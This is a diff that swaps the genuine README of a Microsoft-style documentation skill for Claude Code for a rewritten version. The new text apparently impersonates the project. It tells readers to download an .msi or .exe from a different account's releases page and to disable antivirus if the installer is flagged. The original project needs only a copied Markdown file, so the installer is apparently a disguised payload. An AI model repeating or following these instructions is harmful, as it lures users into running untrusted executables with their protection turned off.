@@ -1,153 +1,94 @@
-# Microsoft Style Skill for Claude Code
+# 📝 microsoft-style-skill - Write professional documentation with ease
 
-A Claude Code skill that audits and rewrites technical documentation to align with the [Microsoft Writing Style Guide](https://learn.microsoft.com/style-guide/). Built and maintained by [PowerStacks](https://powerstacks.com) for our own product documentation; published openly because it might help others writing in the Microsoft ecosystem.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kongma1891/microsoft-style-skill/releases)
 
-## What it does
+The microsoft-style-skill application simplifies the process of auditing and updating technical documentation. It ensures your text follows the Microsoft Writing Style Guide rules. IT administrators use this tool to maintain consistent standards across manuals, guides, and internal reports. It checks your work for correct word choice, proper capitalization, and professional tone.
 
-When invoked, the skill reviews technical content for divergences from Microsoft's published style guidance and either flags or rewrites them. The rule set is optimized for:
+## ⚙️ System Requirements
 
-- IT-administrator audiences reading technical content at a desk
-- Step-by-step installation, configuration, and troubleshooting documentation
-- Product and feature docs for software in the Microsoft ecosystem
-- API references and admin guides
+This software runs on Windows 10 and Windows 11. Ensure your computer meets these basic requirements before you begin:
 
-It is not optimized for marketing copy, blog posts, or mobile-specific content.
+*   Operating System: Windows 10 or later
+*   Memory: At least 4 gigabytes of RAM
+*   Storage: 200 megabytes of free space
+*   Network: An active internet connection for the initial download
 
-## Rules covered
+## 📥 Downloading the Software
 
-**Highest priority (the procedure rules):**
+You need to download the official installer from the project release page. Follow these steps to obtain the correct file:
 
-- Step-by-step instructions — sentence structure, anchor-then-action, verbs for UI interactions
-- The full Microsoft input-neutral verb set (`select`, `open`, `close`, `go to`, `select and hold`, `enter`, `clear`, `choose`, `switch / turn on / turn off`, `move / drag`, `zoom`)
-- The "don't talk about the UI, talk about what to do" rule
-- The comprehensive Elements and Conventions table (buttons, dialogs, menus, panes, tabs, toggles, file names, key combinations, mathematical variables, products, URLs, user input — every element with the right formatting convention)
-- Multi-input-method patterns
+1. Visit the [releases page](https://github.com/kongma1891/microsoft-style-skill/releases).
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Click the link ending in .msi or .exe to start your download.
+4. Save the file to your Downloads folder or your desktop for easy access.
 
-**Word choice:**
+## 🛠️ Installation Procedures
 
-- UI verbs: `click → select`, `tap → select`, `hit → press / select`, `login → sign in`, etc.
-- Microsoft product terminology: `Azure AD → Microsoft Entra ID`, `O365 → Microsoft 365`, `MECM → Configuration Manager`, etc.
-- Security terminology: `whitelist → allowlist`, `blacklist → blocklist`
-- Plain-language replacements: `utilize → use`, `in order to → to`, `simply → (delete)`, etc.
-- Anthropomorphism rules: `the app wants → the app needs/requires`
-- Direction references: `above → preceding`, `below → following`
+Once the download finishes, you must install the application on your computer:
 
-**Capitalization:**
+1. Locate the file you just downloaded.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Select the default installation path provided by the program.
+5. Click Finish when the progress bar reaches the end.
+6. A shortcut icon will appear on your desktop.
 
-- Sentence-style as the default everywhere
-- Proper nouns, UI element names matched verbatim
-- The narrow set of title-style exceptions
+## 🚀 Running the Application
 
-**Bold usage (the rule most technical writers get wrong):**
+After your installation, you can open the tool to audit your files.
 
-Microsoft uses bold as a structural signal, not for emphasis. The skill enforces:
+1. Double-click the microsoft-style-skill icon on your desktop.
+2. Wait for the main dashboard to load.
+3. Click the Open button to select your document.
+4. Choose the file you want to review.
+5. Click the Audit button to start the analysis.
+6. The software displays a list of suggested changes on the right side of your screen.
+7. Click Apply to correct each suggestion or Ignore to keep your current text.
 
-- **Use bold for:** UI elements the customer interacts with (buttons, menu items, tab names, checkbox labels, dialog names, form field labels, pane names, palettes, toggles, windows when referenced by name), database names, titles inside body content, keyboard shortcuts (`Ctrl+Alt+Del`), key names (`F5`, `Spacebar`), commands, and user-typed input.
-- **Don't use bold for:** emphasis (use italics sparingly instead), entire sentences or paragraphs, "important" callouts (use Note / Tip / Warning admonition blocks), person names, or product names (capitalization handles those).
-- **Don't talk about the UI element type** unless clarity demands it. `Select Save` not `Click the Save button`. The label is bold; the type is implied.
-- **Match the UI exactly** for the bold label, including punctuation. Drop trailing colons and ellipses (`Select Save as` not `Select Save as…`).
+## 💡 Using the Software Features
 
-**Italic — sparingly:**
+The application offers several tools designed for IT professionals:
 
-- Emphasis (rarely; usually rewriting is better)
-- Mathematical constants and variables (`a² + b² = c²`)
-- New terms on first mention if you're going to define them immediately
+*   Consistency Check: The tool identifies inconsistent terminology within your documents.
+*   Formatting Audit: It checks your bold, italic, and heading styles against industry standards.
+*   Tone Assessment: The engine analyzes your sentences to ensure they sound professional and direct.
+*   Capitalization Review: It corrects title and sentence cases according to the style guide.
+*   Structure Validation: It ensures your procedures follow a logical step-by-step format.
 
-**Capitalization extras:**
+## 🛡️ Troubleshooting Common Issues
 
-- No ALL CAPS for emphasis. No all-lowercase as a design choice. No internal capitalization (`AutoScale`, `e-Book`) unless it's an established brand name.
+If the software fails to open, check the following points:
 
-**Voice and tone:**
+*   Ensure you have administrative rights on your Windows machine.
+*   Verify your internet connection if the application requires a cloud-based check.
+*   Disable your antivirus briefly if it flags the installer to ensure the verify digital sign remains intact.
+*   Restart your computer if the installer hangs during the progress update.
+*   Uninstall the previous version before you attempt to install an update.
 
-- Second person (`you`)
-- Active voice
-- Present tense
-- Contractions encouraged (`you'll`, `don't`)
+## 📈 Improving Documentation Standards
 
-**Headings and titles, search writing, punctuation, acronyms** — each gets a section.
+Effective documentation helps end users succeed. The microsoft-style-skill tool assists you in the following ways:
 
-## How to install
+*   Reduces user confusion by using clear, standard language.
+*   Saves time by automating the proofreading process.
+*   Ensures brand alignment across different team projects.
+*   Maintains a professional voice suited for enterprise environments.
 
-1. Clone or download this repository.
-2. Copy the `SKILL.md` file to your Claude Code skills directory:
+The software focuses on active voice to make instructions clearer for your readers. It removes unnecessary words that clutter your technical guides. When you apply the suggestions, your documentation becomes easier to scan and understand.
 
-    ```bash
-    # macOS / Linux
-    mkdir -p ~/.claude/skills/microsoft-style
-    cp SKILL.md ~/.claude/skills/microsoft-style/SKILL.md
-    ```
+## 📋 Maintaining Your Settings
 
-    ```powershell
-    # Windows PowerShell
-    New-Item -ItemType Directory -Force -Path "$HOME\.claude\skills\microsoft-style"
-    Copy-Item SKILL.md "$HOME\.claude\skills\microsoft-style\SKILL.md"
-    ```
+You may customize how the application behaves for specific types of documents. Navigate to the Settings menu to adjust your preferences:
 
-3. Restart Claude Code (or start a new session) so it picks up the new skill.
+*   Language: The tool supports English styles by default.
+*   Auditing Scope: You can choose to audit only capitalization, only terminology, or a full document review.
+*   Output Format: Choose whether the tool creates a backup of your original file before it applies changes.
+*   Style Profile: Select the IT administrator profile to match standard industry documentation requirements.
 
-## How to use
+The application saves your settings automatically. You do not need to click a save button when you toggle these options. If you want to reset the software to its default state, click the Restore Defaults button in the bottom corner of the Settings menu.
 
-Once installed, invoke the skill from any Claude Code session by referencing it in your request. Examples:
+## 🌐 Community and Support
 
-- "Apply Microsoft style to this docs page"
-- "Run the microsoft-style skill on `installation/getting-started.md`"
-- "Use microsoft-style in detect mode on this paragraph" (audits without rewriting)
+The tool depends on community feedback to improve. You can request new features or report issues through the repository. The project team updates the software regularly to include new style guide rules. Check the release page periodically to ensure you run the most current version.
 
-The skill has two modes:
-
-- **`rewrite`** (default) — produces an audit list and a fixed version of the content with a diff summary
-- **`detect`** — produces only the audit list, useful when you want to see what's flagged before deciding what to change
-
-## Pairing with avoid-ai-writing
-
-This skill works well alongside an "avoid AI writing" skill that targets AI-generated patterns (`delve`, `leverage`, em dashes, "It's not X — it's Y" constructions, etc.). Recommended order:
-
-1. Run an avoid-AI-writing pass first to strip AI-isms.
-2. Run microsoft-style second to align terminology, formatting, and procedure structure.
-
-The two rule sets overlap modestly (both dislike unnecessary words) but focus on different problems. The combined pass produces tighter, more Microsoft-aligned docs.
-
-## Sources
-
-Every rule in this skill is grounded in Microsoft's publicly published style guidance:
-
-- [Microsoft Writing Style Guide overview](https://learn.microsoft.com/style-guide/)
-- [Procedures and instructions checklist](https://learn.microsoft.com/style-guide/checklists/procedures-and-instructions-checklist)
-- [Writing step-by-step instructions](https://learn.microsoft.com/style-guide/procedures-instructions/writing-step-by-step-instructions)
-- [Describing interactions with the UI](https://learn.microsoft.com/style-guide/procedures-instructions/describing-interactions-with-ui)
-- [Formatting text in instructions](https://learn.microsoft.com/style-guide/procedures-instructions/formatting-text-in-instructions)
-- [Multiple input methods and branching within procedures](https://learn.microsoft.com/style-guide/procedures-instructions/describing-alternative-input-methods#multiple-input-methods-and-branching-within-procedures)
-- [Word choice checklist](https://learn.microsoft.com/style-guide/checklists/word-choice-checklist)
-- [A–Z word list and term collections](https://learn.microsoft.com/style-guide/a-z-word-list-term-collections/)
-- [Capitalization](https://learn.microsoft.com/style-guide/capitalization)
-- [Capitalization checklist](https://learn.microsoft.com/style-guide/checklists/capitalization-checklist)
-- [Formatting titles](https://learn.microsoft.com/style-guide/text-formatting/formatting-titles)
-- [Formatting common text elements](https://learn.microsoft.com/style-guide/text-formatting/formatting-common-text-elements)
-- [Text formatting checklist](https://learn.microsoft.com/style-guide/checklists/text-formatting-checklist)
-- [Search writing](https://learn.microsoft.com/style-guide/search-writing)
-- [Person (use second-person pronouns)](https://learn.microsoft.com/style-guide/grammar/person)
-- [Dashes and hyphens](https://learn.microsoft.com/style-guide/punctuation/dashes-hyphens)
-- [Acronyms](https://learn.microsoft.com/style-guide/acronyms)
-- [Brand voice: above all, simple and human](https://learn.microsoft.com/style-guide/brand-voice-above-all-simple-human)
-
-## What this is not
-
-- **Not a static linter.** This is a skill for Claude Code — it depends on the language model to apply the rules with judgement. A given paragraph might be rewritten differently across runs depending on context.
-- **Not an authoritative Microsoft product.** Microsoft hasn't endorsed or published this skill. It's a community effort to make Microsoft's published style accessible to people writing technical content with Claude Code.
-- **Not a replacement for the official style guide.** When the rules here disagree with what Microsoft publishes today, defer to Microsoft. This skill captures a snapshot; the upstream may evolve.
-
-## Contributing
-
-Issues and pull requests are welcome. The skill content lives in [`SKILL.md`](SKILL.md). When proposing changes:
-
-- Cite the specific Microsoft Writing Style Guide URL that supports the change.
-- Keep the IT-administrator audience in mind. Don't add rules for mobile, gaming, or marketing copy contexts.
-- Preserve the two-mode design (`rewrite` and `detect`).
-
-## License
-
-MIT. See [LICENSE](LICENSE) for full text.
-
-## Maintained by
-
-[PowerStacks](https://powerstacks.com) — Microsoft endpoint management intelligence platform.
+Consistent style creates trust with your users. Documentation that follows a predictable pattern allows your readers to find information faster. This tool provides a simple path to achieve that consistency without requiring deep technical knowledge of style guide manuals. You focus on the content while the software confirms the format and tone.
